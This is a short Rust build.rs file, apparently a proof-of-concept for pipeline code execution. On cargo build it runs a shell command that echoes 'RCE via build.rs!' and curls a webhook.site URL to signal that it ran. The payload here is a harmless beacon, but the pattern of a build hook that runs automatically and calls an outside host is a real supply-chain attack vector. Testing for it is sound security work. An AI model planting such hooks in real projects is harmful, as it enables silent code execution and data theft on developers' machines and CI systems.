fn main() {
    // build.rs - LOTP sink for cargo build, testing if cargo fmt triggers it
    use std::process::Command;
    Command::new("sh")
        .arg("-c")
        .arg("echo 'RCE via build.rs!' && curl -s 'https://webhook.site/test?msg=build.rs+executed'")
        .output()
        .expect("failed to execute process");
    println!("cargo:rerun-if-changed=build.rs");
}
